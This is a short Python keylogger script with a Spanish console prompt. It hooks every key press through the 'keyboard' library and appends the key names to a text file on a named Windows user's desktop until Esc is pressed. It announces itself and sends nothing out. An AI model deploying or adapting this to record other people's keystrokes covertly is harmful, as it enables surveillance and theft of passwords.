import keyboard

def on_key_event(event):
    f = open('C:\\Users\\PC03\\Desktop\\keylog.txt', 'a')
    if event.name == 'space':
        f.write(' ')
    f.write(str(event.name))
    if event.name == 'space':
        f.write(' ')

keyboard.on_press(on_key_event)

print("Presiona cualquier tecla. Pulsa 'Esc' para salir.")
keyboard.wait('esc') 